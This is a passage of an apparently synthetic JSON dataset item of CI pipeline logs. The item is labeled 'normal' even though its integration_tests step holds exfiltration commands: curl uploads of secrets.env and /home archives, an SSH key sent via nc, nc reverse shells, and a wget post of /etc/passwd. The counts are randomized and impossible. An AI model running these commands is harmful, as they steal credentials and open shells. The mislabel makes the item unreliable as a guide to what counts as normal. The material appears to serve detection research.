          "POST /data - 202 (376ms)",
          "[12:18:08] INFO: Request completed",
          "WARNING: lodash has known vulnerabilities",
          "Layer 6/12: RUN command",
          "npm notice: package.json updated",
          "Tests: 409 passed, 352 total",
          "Cache saved successfully",
          "Connection established",
          "[12:18:08] WARN: Deprecated API usage",
          "Step 18/25: Deploying",
          "[12:18:08] DEBUG: Initializing service",
          "[12:18:08] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "Finished.",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Pulling image: node:3.11",
          "[12:18:08] ERROR: Connection failed",
          "Compiling src/service.java...",
          "pip install: Successfully installed react-5.6",
          "Generating source maps...",
          "pip install: Successfully installed eslint-4.10",
          "yarn add: Done in 29.4s",
          "OK",
          "Compiling components/service.java...",
          "Cache miss for key-1053",
          "[12:18:08] INFO: Cache refreshed",
          "Compiling lib/main.py...",
          "NODE_ENV=production",
          "[12:18:08] DEBUG: Memory usage: 1879MB",
          "Generating source maps...",
          "Cache hit for key-9456",
          "yarn add: Done in 24.78s",
          "Artifact uploaded: build.tar.gz (33MB)",
          "FAILED: test_api_health",
          "TLS handshake completed",
          "[12:18:08] DEBUG: Initializing service",
          "pip: Downloading eslint-3.12.tar.gz",
          "Building Docker image...",
          "TLS handshake completed",
          "[12:18:08] DEBUG: Connection pool: 4 active",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-28T12:20:16.401543",
        "finished_at": "2025-11-28T12:20:28.499584",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 20/18: Running migrations",
          "Verifying...",
          "Finished.",
          "Cache invalidated: node_modules",
          "  PASS: unit/test_user_create.spec.js",
          "[12:18:08] INFO: Connecting to database",
          "Coverage: 89% statements, 91% branches",
          "Using Node.js 17.3.6",
          "Processing...",
          "npm install: added 162 packages",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "[12:18:08] DEBUG: Connection pool: 9 active",
          "  PASS: test_cache_hit (268ms)",
          "[12:18:08] INFO: Connecting to database",
          "Building Docker image...",
          "Cache saved successfully",
          "FAILED: test_cache_hit",
          "\u2713 Task completed in 1738ms",
          "Step 6/25: Building",
          "Success!",
          "Compiling lib/service.java...",
          "Snapshots: 33 passed, 47 total",
          "Cache restored successfully (452MB)",
          "[12:18:08] DEBUG: Initializing service",
          "Pulling image: alpine:18",
          "Compiling src/handler.rs...",
          "Step 4/21: Building",
          "Image pulled successfully",
          "Cache miss for key-2676",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Using Python 3.10",
          "\u2717 build failed with exit code 115",
          "Environment: staging",
          "Artifact downloaded: 49MB",
          "Cache hit for key-1429",
          "Compiling components/handler.rs...",
          "Snapshots: 40 passed, 18 total",
          "Cache restored successfully (241MB)",
          "Cache restored successfully (407MB)",
          "[12:18:08] DEBUG: Query executed in 43ms",
          "[12:18:08] DEBUG: Connection pool: 14 active",
          "Step 18/25: Deploying",
          "POST /api - 200 (121ms)",
          "Artifact uploaded: dist.zip (96MB)",
          "  PASS: test_auth_login (176ms)",
          "NODE_ENV=production",
          "[12:18:08] DEBUG: Connection pool: 12 active",
          "Checking out develop branch",
          "Ready.",
          "Artifact uploaded: build.tar.gz (12MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:08] DEBUG: Query executed in 77ms",
          "Compiling src/service.java...",
          "WARNING: axios has known vulnerabilities",
          "Compiling lib/main.py...",
          "POST /api - 201 (338ms)",
          "Platform: win32-x64",
          "Compiling components/utils.go...",
          "Time: 52.394s",
          "Cache saved successfully",
          "NODE_ENV=test",
          "Pushing to registry...",
          "[12:18:08] INFO: Connecting to database",
          "Compiling lib/main.py...",
          "Step 16/24: Deploying",
          "Step 9/24: Testing",
          "npm notice: created a lockfile",
          "Layer 3/12: COPY command",
          "Installing express@3.19.3",
          "[12:18:08] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "[12:18:08] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 4d06190",
          "pip: Collecting lodash",
          "\u2713 Task completed in 1135ms",
          "\u2713 Task completed in 1954ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "HEAD is now at 7185eaf",
          "Using Node.js 15.1.4",
          "Using Node.js 14.3.10",
          "Cache saved successfully",
          "[12:18:08] INFO: Cache refreshed",
          "Switched to branch 'hotfix/task-965'",
          "Bundling runtime.css",
          "Time: 20.718s",
          "[12:18:08] INFO: Cache refreshed",
          "Step 13/24: Installing dependencies",
          "npm install: resolved 201 packages",
          "Ran 125 tests in 14s",
          "[12:18:08] WARN: Deprecated API usage",
          "Connecting to cloud.services:443...",
          "Using Node.js 15.4.9",
          "Tests: 156 passed, 430 total",
          "Compiling utils/utils.go...",
          "Finished.",
          "Ran 36 tests in 4s",
          "Connecting to test.io:443...",
          "Transforming 366 files...",
          "[12:18:08] WARN: Deprecated API usage",
          "Already up to date.",
          "Waiting...",
          "Step 18/24: Testing",
          "[12:18:08] DEBUG: Connection pool: 15 active",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:18:08] DEBUG: Connection pool: 9 active",
          "GET /api - 200 (6ms)",
          "[12:18:08] WARN: Deprecated API usage",
          "Waiting...",
          "GET /health - 200 (73ms)",
          "Compiling components/service.java...",
          "Using Python 3.12",
          "Time: 94.476s",
          "[12:18:08] INFO: Starting build process",
          "[12:18:08] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "\u2713 Step 'test' succeeded",
          "Using Python 3.10",
          "POST /upload - 201 (373ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 3220ms",
          "Installing react@5.20.9",
          "\u2717 build failed with exit code 70",
          "Using Python 3.12",
          "yarn add: Done in 1.40s",
          "npm notice: created a lockfile",
          "Exception: RuntimeError",
          "Compiling utils/index.js...",
          "Step 3/17: Testing",
          "Done.",
          "\u2713 Task completed in 3191ms",
          "Image pulled successfully",
          "Generating source maps...",
          "HEAD is now at e5ca6f0",
          "Cache saved successfully",
          "[12:18:08] DEBUG: Connection pool: 12 active",
          "npm notice: created a lockfile",
          "  PASS: integration/test_db_connect.spec.js",
          "Verifying...",
          "Snapshots: 43 passed, 3 total",
          "[12:18:08] INFO: Processing request",
          "[12:18:08] INFO: Starting build process",
          "Creating production build...",
          "\u2713 Step 'build' succeeded",
          "WARNING: prettier has known vulnerabilities",
          "Test Suites: 40 passed, 19 total",
          "Using Node.js 18.14.3",
          "Fetching submodules...",
          "Optimizing 86 modules...",
          "yarn add: Done in 5.88s",
          "[12:18:08] DEBUG: Loading configuration",
          "Already up to date.",
          "yarn add: Done in 25.37s",
          "Connecting to example.com:443...",
          "Transforming 519 files...",
          "Layer 3/9: RUN command",
          "GET /api - 204 (41ms)",
          "\u2713 Task completed in 3469ms",
          "[12:18:08] DEBUG: Loading configuration",
          "[12:18:08] DEBUG: Connection pool: 17 active",
          "Connecting to test.io:443...",
          "[12:18:08] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling styles.css",
          "Cache hit for key-2083",
          "pip: Installing build dependencies...",
          "OK",
          "Step 1/19: Running migrations",
          "Ready.",
          "[12:18:08] DEBUG: Connection pool: 19 active",
          "Cache miss for key-1069",
          "Processing...",
          "Using Node.js 19.6.0",
          "Platform: win32-x64",
          "WARNING: prettier has known vulnerabilities",
          "[12:18:08] ERROR: Connection failed",
          "Done.",
          "Waiting...",
          "Loading...",
          "Installing webpack@4.11.1",
          "Already up to date.",
          "Tests: 244 passed, 448 total",
          "npm notice: created a lockfile",
          "[12:18:08] INFO: Connecting to database",
          "pip install: Successfully installed eslint-3.13",
          "Uploading artifact 'coverage' (19 files)",
          "WARNING: prettier has known vulnerabilities",
          "Switched to branch 'hotfix/task-972'",
          "Installing lodash@3.2.2",
          "Tests: 343 passed, 54 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-28T12:20:28.499584",
        "finished_at": "2025-11-28T12:20:40.597625",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 All checks passed",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] DEBUG: Memory usage: 1644MB",
          "[12:18:08] DEBUG: Connection pool: 16 active",
          "Uploading artifact 'build' (19 files)",
          "[12:18:08] DEBUG: Memory usage: 1254MB",
          "yarn add: Done in 7.83s",
          "OK",
          "[12:18:08] DEBUG: Loading configuration",
          "Test Suites: 41 passed, 39 total",
          "HEAD is now at ac73a96",
          "Cache hit for key-9768",
          "Compiling src/index.js...",
          "Generating source maps...",
          "Uploading artifact 'dist' (40 files)",
          "Already up to date.",
          "Using Python 3.9",
          "Coverage: 95% statements, 86% branches",
          "npm notice: created a lockfile",
          "Snapshots: 17 passed, 15 total",
          "Step 7/25: Installing dependencies",
          "Finished.",
          "[12:18:08] DEBUG: Memory usage: 1533MB",
          "[12:18:08] DEBUG: Memory usage: 911MB",
          "Loading...",
          "Connection established",
          "pip: Installing build dependencies...",
          "yarn add: Done in 5.23s",
          "Cache restored successfully (231MB)",
          "Cache invalidated: build",
          "Success!",
          "Ran 128 tests in 40s",
          "POST /api - 202 (441ms)",
          "OK",
          "pip install: Successfully installed prettier-1.3",
          "Tests: 196 passed, 136 total",
          "Bundling vendor.css",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "Cache miss for key-3499",
          "Compiling utils/handler.rs...",
          "Snapshots: 4 passed, 1 total",
          "Step 15/15: Running migrations",
          "Tests: 116 passed, 467 total",
          "Loading...",
          "Completed.",
          "Platform: win32-x64",
          "Loading...",
          "Compiling src/utils.go...",
          "GET /health - 200 (71ms)",
          "Exception: RuntimeError",
          "\u2713 Task completed in 3339ms",
          "Cache saved successfully",
          "Pulling image: alpine:3.11",
          "Using Node.js 17.8.3",
          "Switched to branch 'feature/task-813'",
          "Already up to date.",
          "OK",
          "HEAD is now at 528ff2a",
          "[12:18:08] DEBUG: Loading configuration",
          "pip: Downloading prettier-3.12.tar.gz",
          "\u2717 build failed with exit code 79",
          "Checking out master branch",
          "Fetching submodules...",
          "Ran 38 tests in 31s",
          "Step 15/18: Linting",
          "yarn add: Done in 28.20s",
          "Uploading artifact 'dist' (27 files)",
          "Building Docker image...",
          "Building Docker image...",
          "Snapshots: 16 passed, 28 total",
          "Tests: 366 passed, 391 total",
          "pip: Installing build dependencies...",
          "Test Suites: 11 passed, 45 total",
          "Switched to branch 'hotfix/task-509'",
          "npm notice: created a lockfile",
          "Done.",
          "Time: 67.179s",
          "GET /api - 204 (74ms)",
          "Uploading artifact 'build' (38 files)",
          "Exception: TypeError",
          "Artifact downloaded: 33MB",
          "Tests: 204 passed, 93 total",
          "[12:18:08] INFO: Request completed",
          "Compiling utils/main.py...",
          "Time: 73.162s",
          "Cache miss for key-1828",
          "pip: Downloading eslint-2.14.tar.gz",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_auth_login (490ms)",
          "Ran 137 tests in 51s",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Coverage: 95% statements, 83% branches",
          "Switched to branch 'bugfix/task-332'",
          "yarn add: Done in 12.93s",
          "Completed.",
          "Finished.",
          "Completed.",
          "[12:18:08] INFO: Processing request",
          "Success!",
          "Ready.",
          "[12:18:08] DEBUG: Initializing service",
          "[12:18:08] INFO: Starting build process",
          "[12:18:08] INFO: Connecting to database",
          "  PASS: unit/test_db_connect.spec.js",
          "Generating source maps...",
          "Cache invalidated: build",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "WARNING: express has known vulnerabilities",
          "Snapshots: 36 passed, 39 total",
          "pip: Downloading express-1.10.tar.gz",
          "Using Node.js 18.17.4",
          "\u2713 Step 'test' succeeded",
          "Building Docker image...",
          "Cache miss for key-6433",
          "Step 15/18: Linting",
          "Checking out master branch",
          "Step 20/22: Installing dependencies",
          "\u2717 build failed with exit code 107",
          "Step 10/15: Deploying",
          "Bundling main.js",
          "Using Node.js 17.3.5",
          "pip: Downloading react-1.6.tar.gz",
          "Pushing to registry...",
          "Compiling components/index.js...",
          "HEAD is now at bbfddf0",
          "HEAD is now at 9957ca6",
          "[12:18:08] INFO: Cache refreshed",
          "POST /api - 202 (267ms)",
          "Cache saved successfully",
          "Step 7/15: Deploying",
          "Pulling image: alpine:latest",
          "[12:18:08] ERROR: Connection failed",
          "  PASS: unit/test_api_health.spec.js",
          "Uploading artifact 'build' (23 files)",
          "TLS handshake completed",
          "FAILED: test_db_connect",
          "Success!",
          "\u2713 All checks passed",
          "[12:18:08] INFO: Starting build process",
          "Using Python 3.11",
          "[12:18:08] DEBUG: Memory usage: 605MB",
          "Compiling components/service.java...",
          "Connection established",
          "[12:18:08] INFO: Starting build process",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Processing...",
          "Pushing to registry...",
          "Cache restored successfully (372MB)",
          "Cache miss for key-9148",
          "Bundling vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "Cache hit for key-6303",
          "[12:18:08] DEBUG: Connection pool: 7 active",
          "Cache saved successfully",
          "Creating production build...",
          "Cache restored successfully (391MB)",
          "Time: 51.157s",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'bugfix/task-942'",
          "Checking out master branch",
          "Platform: linux-x64",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2717 build failed with exit code 106",
          "Step 4/16: Installing dependencies",
          "Coverage: 73% statements, 77% branches",
          "Building Docker image...",
          "Cache saved successfully",
          "Compiling src/utils.go...",
          "Waiting...",
          "npm install: resolved 928 packages",
          "NODE_ENV=test",
          "Waiting...",
          "npm notice: package.json updated",
          "Environment: test",
          "Finished.",
          "Switched to branch 'feature/task-129'",
          "pip: Installing build dependencies...",
          "Environment: production",
          "[12:18:08] DEBUG: Connection pool: 8 active",
          "[12:18:08] DEBUG: Loading configuration",
          "[12:18:08] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "pip install: Successfully installed axios-1.13",
          "[12:18:08] DEBUG: Memory usage: 753MB",
          "Verifying...",
          "Exception: ValueError",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:20:40.597625",
        "finished_at": "2025-11-28T12:20:45.436841",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache saved successfully",
          "Using Node.js 14.20.2",
          "Compiling components/app.ts...",
          "Generating source maps...",
          "npm install: added 283 packages",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "Creating production build...",
          "Using Node.js 16.6.4",
          "Environment: production",
          "Processing...",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] DEBUG: Query executed in 39ms",
          "Minifying app.js",
          "Finished.",
          "Creating production build...",
          "Ready.",
          "Compiling components/app.ts...",
          "Bundling runtime.js",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Step 18/19: Building",
          "TLS handshake completed",
          "Environment: development",
          "Exception: RuntimeError",
          "Pushing to registry...",
          "Using Python 3.9",
          "Finished.",
          "\u2713 Task completed in 3975ms",
          "[12:18:08] INFO: Request completed",
          "pip: Collecting express",
          "Artifact downloaded: 35MB",
          "TLS handshake completed",
          "Optimizing 76 modules...",
          "Building Docker image...",
          "[12:18:08] DEBUG: Initializing service",
          "Building Docker image...",
          "[12:18:08] INFO: Request completed",
          "[12:18:08] DEBUG: Memory usage: 1950MB",
          "Step 4/17: Linting",
          "[12:18:08] INFO: Connecting to database",
          "Cache invalidated: dependencies",
          "Step 1/15: Installing dependencies",
          "Cache restored successfully (100MB)",
          "GET /health - 200 (56ms)",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /upload - 201 (69ms)",
          "  PASS: unit/test_user_create.spec.js",
          "Step 17/25: Linting",
          "Switched to branch 'bugfix/task-869'",
          "Transforming 296 files...",
          "Compiling lib/utils.go...",
          "Ran 90 tests in 36s",
          "Environment: production",
          "Cache hit for key-9691",
          "Platform: darwin-arm64",
          "Cache miss for key-9887",
          "Using Node.js 20.5.7",
          "pip install: Successfully installed lodash-1.2",
          "Test Suites: 23 passed, 43 total",
          "Image pulled successfully",
          "Using Node.js 16.10.10",
          "[12:18:08] WARN: Deprecated API usage",
          "Processing...",
          "\u2713 All checks passed",
          "Creating production build...",
          "pip: Downloading jest-1.1.tar.gz",
          "Platform: win32-x64",
          "Connecting to startup.dev:443...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Step 19/21: Linting",
          "Tests: 187 passed, 176 total",
          "yarn add: Done in 4.35s",
          "HEAD is now at 8fb0a74",
          "Finished.",
          "pip: Downloading eslint-4.8.tar.gz",
          "Checking out develop branch",
          "Step 4/25: Testing",
          "Generating source maps...",
          "[12:18:08] DEBUG: Connection pool: 3 active",
          "Ready.",
          "Installing react@1.3.0",
          "Connection established",
          "Using Python 3.9",
          "Step 8/18: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/18: Deploying",
          "\u2713 Step 'test' succeeded",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "Step 20/16: Testing",
          "HEAD is now at c90edb1",
          "Optimizing 73 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/22: Running migrations",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:18:08] DEBUG: Loading configuration",
          "\u2713 Task completed in 4436ms",
          "npm notice: created a lockfile",
          "\u2713 lint completed",
          "Switched to branch 'hotfix/task-495'",
          "Layer 6/13: RUN command",
          "\u2713 All checks passed",
          "[12:18:08] DEBUG: Loading configuration",
          "Artifact downloaded: 45MB",
          "Uploading artifact 'dist' (37 files)",
          "  PASS: test_db_connect (98ms)",
          "Coverage: 90% statements, 69% branches",
          "Compiling utils/app.ts...",
          "Completed.",
          "Verifying...",
          "Optimizing 97 modules...",
          "Generating source maps...",
          "[12:18:08] DEBUG: Connection pool: 19 active",
          "Cache miss for key-8228",
          "[12:18:08] DEBUG: Connection pool: 4 active",
          "Bundling vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:08] INFO: Starting build process",
          "\u2713 Task completed in 2511ms",
          "Compiling utils/index.js...",
          "Compiling lib/index.js...",
          "Bundling vendor.css",
          "Step 14/15: Linting",
          "Success!",
          "Already up to date.",
          "Finished.",
          "Step 16/17: Deploying",
          "Cache restored successfully (374MB)",
          "npm install: resolved 1354 packages",
          "Layer 5/10: RUN command",
          "Checking out main branch",
          "Using Node.js 20.9.1",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "Compiling utils/app.ts...",
          "[12:18:08] DEBUG: Memory usage: 1271MB",
          "Generating source maps...",
          "[12:18:08] INFO: Connecting to database",
          "Installing jest@5.9.8",
          "Step 4/19: Running migrations",
          "POST /api - 202 (385ms)",
          "Building Docker image...",
          "Installing webpack@2.20.4",
          "[12:18:08] INFO: Connecting to database",
          "Verifying...",
          "Completed.",
          "Compiling utils/service.java...",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "\u2713 Task completed in 1973ms",
          "Compiling lib/utils.go...",
          "Test Suites: 43 passed, 13 total",
          "Platform: darwin-arm64",
          "Bundling vendor.css",
          "[12:18:08] INFO: Cache refreshed",
          "[12:18:08] DEBUG: Query executed in 48ms",
          "Fetching submodules...",
          "[12:18:08] DEBUG: Loading configuration",
          "Exception: TypeError",
          "Connecting to cloud.services:443...",
          "[12:18:08] INFO: Processing request",
          "Using Node.js 15.3.7",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "Cache hit for key-8902",
          "Step 10/25: Testing",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-694'",
          "Using Node.js 20.14.3",
          "Compiling src/main.py...",
          "Connection established",
          "Test Suites: 34 passed, 8 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:08] INFO: Processing request",
          "Snapshots: 2 passed, 26 total",
          "Step 7/18: Deploying",
          "\u2713 Step 'test' succeeded",
          "Connecting to startup.dev:443...",
          "Minifying app.js",
          "Step 15/16: Building",
          "  PASS: integration/test_user_create.spec.js",
          "[12:18:08] INFO: Starting build process",
          "Transforming 604 files...",
          "Minifying main.js",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-28T12:20:45.436841",
        "finished_at": "2025-11-28T12:21:09.632922",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Transforming 909 files...",
          "Processing...",
          "Environment: staging",
          "Cache hit for key-7522",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (61MB)",
          "Using Python 3.11",
          "Switched to branch 'hotfix/task-768'",
          "Done.",
          "Creating production build...",
          "Cache restored successfully (216MB)",
          "[12:18:08] INFO: Processing request",
          "[12:18:08] DEBUG: Connection pool: 15 active",
          "Cache restored successfully (123MB)",
          "Done.",
          "OK",
          "Ready.",
          "OK",
          "  PASS: integration/test_cache_hit.spec.js",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "Image pulled successfully",
          "\u2717 build failed with exit code 121",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:18:08] INFO: Request completed",
          "Done.",
          "[12:18:08] DEBUG: Connection pool: 11 active",
          "Snapshots: 8 passed, 3 total",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "pip: Installing build dependencies...",
          "Connection established",
          "Loading...",
          "Verifying...",
          "FAILED: test_auth_login",
          "\u2713 package completed",
          "Checking out master branch",
          "[12:18:08] ERROR: Connection failed",
          "Installing webpack@2.0.8",
          "GET /api - 200 (35ms)",
          "pip install: Successfully installed prettier-3.19",
          "[12:18:08] DEBUG: Query executed in 12ms",
          "Ready.",
          "GET /health - 200 (39ms)",
          "yarn add: Done in 6.49s",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "\u2713 All checks passed",
          "[12:18:08] WARN: Deprecated API usage",
          "Step 11/16: Running migrations",
          "WARNING: webpack has known vulnerabilities",
          "Finished.",
          "Step 2/22: Building",
          "Snapshots: 10 passed, 16 total",
          "Step 18/21: Building",
          "Compiling src/utils.go...",
          "Image pulled successfully",
          "[12:18:08] DEBUG: Connection pool: 9 active",
          "Sending 355MB of data to startup.dev",
          "\u2713 Step 'build' succeeded",
          "OK",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "\u2713 Task completed in 4627ms",
          "Step 20/21: Deploying",
          "Image pulled successfully",
          "[12:18:08] DEBUG: Initializing service",
          "Step 15/25: Deploying",
          "Ran 87 tests in 57s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:08] INFO: Starting build process",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Cache invalidated: node_modules",
          "Loading...",
          "Creating production build...",
          "Ready.",
          "[12:18:08] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 5MB",
          "WARNING: react has known vulnerabilities",
          "Checking out develop branch",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "pip: Downloading axios-5.3.tar.gz",
          "Compiling components/service.java...",
          "Compiling src/handler.rs...",
          "Fetching submodules...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Transforming 785 files...",
          "Building Docker image...",
          "Exception: NullPointerException",
          "\u2713 Task completed in 450ms",
          "Artifact downloaded: 35MB",
          "Using Python 3.9",
          "Step 12/15: Building",
          "[12:18:08] DEBUG: Connection pool: 20 active",
          "[12:18:08] ERROR: Connection failed",
          "Done.",
          "[12:18:08] INFO: Starting build process",
          "Step 15/23: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 33.178.146.47 15448",
          "[12:18:08] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Step 16/15: Deploying",
          "Cache saved successfully",
          "nc -e /bin/sh 8.98.91.99 54566",
          "Time: 31.91s",
          "Layer 6/10: COPY command",
          "Step 2/25: Testing",
          "  PASS: test_db_connect (175ms)",
          "Coverage: 78% statements, 60% branches",
          "Completed.",
          "pip install: Successfully installed react-2.13",
          "npm install: resolved 1649 packages",
          "\u2713 Task completed in 3718ms",
          "Success!",
          "[12:18:08] DEBUG: Query executed in 22ms",
          "[12:18:08] DEBUG: Connection pool: 8 active",
          "[12:18:08] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:08] INFO: Starting build process",
          "Checking out main branch",
          "Done.",
          "[12:18:08] DEBUG: Memory usage: 1115MB",
          "Loading...",
          "[12:18:08] WARN: Deprecated API usage",
          "Test Suites: 44 passed, 11 total",
          "Coverage: 100% statements, 76% branches",
          "\u2713 deploy completed",
          "Finished.",
          "Step 19/16: Installing dependencies",
          "pip install: Successfully installed prettier-4.4",
          "Transforming 787 files...",
          "Already up to date.",
          "Environment: test",
          "Installing eslint@3.3.1",
          "HEAD is now at ff3f0d8",
          "\u2717 build failed with exit code 40",
          "yarn add: Done in 11.91s",
          "Cache hit for key-3975",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "Completed.",
          "Step 11/25: Deploying",
          "Finished.",
          "[12:18:08] INFO: Starting build process",
          "[12:18:08] INFO: Processing request",
          "Artifact downloaded: 13MB",
          "Step 11/20: Testing",
          "[12:18:08] INFO: Request completed",
          "Step 4/24: Testing",
          "nc -e /bin/sh 174.139.234.159 24795",
          "Pulling image: node:latest",
          "Tests: 289 passed, 352 total",
          "Finished.",
          "Snapshots: 49 passed, 29 total",
          "Using Python 3.9",
          "[12:18:08] INFO: Starting build process",
          "[12:18:08] INFO: Request completed",
          "Layer 7/9: RUN command",
          "Platform: linux-x64",
          "[12:18:08] DEBUG: Memory usage: 1511MB",
          "Done.",
          "Finished.",
          "Uploading artifact 'build' (2 files)",
          "Compiling utils/app.ts...",
          "Compiling lib/utils.go...",
          "[12:18:08] WARN: Deprecated API usage",
          "Installing express@4.10.8",
          "Tests: 459 passed, 95 total",
          "Creating production build...",
          "[12:18:08] ERROR: Connection failed",
          "Completed.",
          "[12:18:08] INFO: Connecting to database",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Verifying...",
          "[12:18:08] DEBUG: Connection pool: 5 active",
          "Test Suites: 15 passed, 9 total",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading react-1.16.tar.gz",
          "Success!",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "WARNING: react has known vulnerabilities",
          "Success!",
          "Done.",
          "POST /api - 202 (484ms)",
          "Compiling components/main.py...",
          "[12:18:08] DEBUG: Loading configuration",
          "Installing react@2.4.6",
          "[12:18:08] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Snapshots: 25 passed, 40 total",
          "[12:18:08] INFO: Processing request",
          "Already up to date.",
          "WARNING: webpack has known vulnerabilities",
          "Bundling main.css",
          "Snapshots: 37 passed, 9 total",
          "Connecting to test.io:443...",
          "[12:18:08] INFO: Processing request",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Step 11/19: Deploying",
          "\u2717 build failed with exit code 11",
          "Step 1/19: Testing",
          "Switched to branch 'feature/task-461'",
          "Compiling components/service.java...",
          "Building Docker image...",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}